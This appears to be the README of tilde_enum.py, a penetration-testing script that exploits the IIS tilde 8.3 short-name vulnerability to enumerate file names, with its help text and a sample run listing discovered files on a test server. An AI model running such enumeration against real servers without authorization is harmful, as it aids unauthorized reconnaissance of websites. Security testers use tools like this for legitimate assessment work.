iis_tilde_enum
==========

Takes a URL and then exploits the IIS tilde 8.3 enumeration vuln and tries to get you full file names.

You feed this script a URL and also a word list of potential file names. The script will look up the file
roots in your word list and then try them with appropriate extensions.

For word lists, the [fuzzdb](https://code.google.com/p/fuzzdb/) word lists are pretty good. We sometimes use the
https://code.google.com/p/fuzzdb/source/browse/trunk/discovery/PredictableRes/raft-small-words-lowercase.txt
(or large or medium) for this work.

This is not a directory enumerator (i.e., tries all words in a list against a web server). It will only find
directories that have names longer than 8 characters (since only then will they have 8.3 names and be recognized
by the vulnerability). You should still try to enumerate directories using a word list and
[DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) or Burp Intruder or something.

Just as a note: on Windows computers you can view 8.3 names in the command prompt window by using the
`dir /x` command. One of the columns will be the 8.3 name (if there is one).

Always enjoy feedback and suggestions.


Help
====
<pre>$  ./tilde_enum.py -h
usage: tilde_enum.py [-h] [-d DIRWORDLIST] [-f] [-o OUT_FILE] [-p PROXY]
                     [-u URL] [-v VERBOSE_LEVEL] [-w WAIT]
                     [--resume RESUME_STRING] [--dir-only]

Exploits and expands the file names found from the tilde enumeration vuln

optional arguments:
  -h, --help            show this help message and exit
  -d DIRWORDLIST        an optional wordlist for directory name content
  -f                    force testing of the server even if the headers do not
                        report it as an IIS system
  -o OUT_FILE           Filename to store output
  -p PROXY              Use a proxy host:port
  -u URL                URL to scan
  -v VERBOSE_LEVEL      verbose level of output (0~2)
  -w WAIT               time in seconds to wait between requests
  --resume RESUME_STRING
                        Resume from a given name (length <= 6)
  --dir-only            Search for directories only
</pre>


Sample Output
======
<pre>
$  ./tilde_enum.py -u http://iis -v 2 -w 0.1 -o output.txt
[-]  Verbose Level=2 ....brace yourself for additional information.
[-]  Testing with dummy file request http://iis/subdir/SQnxKKN5qE2MS.htm
[-]    URLNotThere -> HTTP Code: 404, Response Length: 1379
[-]  Testing with user-submitted http://iis/subdir/
[-]    URLUser -> HTTP Code: 200, Response Length: 7608
[+]  HTTP Response Codes: {'user_length': 7608, 'not_there_length': 1379, 'user_code': 200, 'not_there_code': 404}
[-]  User-supplied delay detected. Waiting 0.1 seconds between HTTP requests.
[+]  The server is reporting that it is IIS (Microsoft-IIS/6.0).
[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..
[+]  Found file:  cocee6~1.asp
[+]  Found file:  codeec~1.asp
[+]  Found file:  cod64a~1.asp
[+]  Found file:  cod64e~1.asp
[+]  Found file:  cod642~1.asp
[+]  Found file:  coe2c8~1.asp
[+]  Found file:  coe6b4~1.asp
[+]  counterEnum: http://iis/subdir/conten counter end with ~4.
[+]  Found file:  conten~1.asp
[+]  Found file:  conten~2.asp
[+]  Found file:  conten~3.asp
[+]  Found file:  conten~4.asp
[+]  Found file:  co8995~1.asp
[+]  Found file:  co9999~1.asp
[+]  counterEnum: http://iis/subdir/flash_ counter end with ~3.
[+]  Found file:  flash_~1.htm
[+]  Found file:  flash_~2.htm
[+]  Found file:  flash_~3.htm
[+]  Found file:  index~1.asp
[+]  Found file:  index~1.htm
[+]  Found file:  login_~1.asp
[+]  Found file:  menu-s~1.asp
[+]  Found file:  sso_ch~1.asp
[-]  Finished doing the 8.3 enumeration for /subdir/.

---------- FINAL OUTPUT ------------------------------
http://iis/subdir/co8995~1.asp
http://iis/subdir/co9999~1.asp
http://iis/subdir/cocee6~1.asp
http://iis/subdir/cod642~1.asp
http://iis/subdir/cod64a~1.asp
http://iis/subdir/cod64e~1.asp
http://iis/subdir/codeec~1.asp
http://iis/subdir/coe2c8~1.asp
http://iis/subdir/coe6b4~1.asp
http://iis/subdir/conten~1.asp
http://iis/subdir/conten~2.asp
http://iis/subdir/conten~3.asp
http://iis/subdir/conten~4.asp
http://iis/subdir/flash_~1.htm
http://iis/subdir/flash_~2.htm
http://iis/subdir/flash_~3.htm
http://iis/subdir/index~1.asp
http://iis/subdir/index~1.htm
http://iis/subdir/login_~1.asp
http://iis/subdir/menu-s~1.asp
http://iis/subdir/sso_ch~1.asp
---------- OUTPUT COMPLETE ---------------------------
</pre>
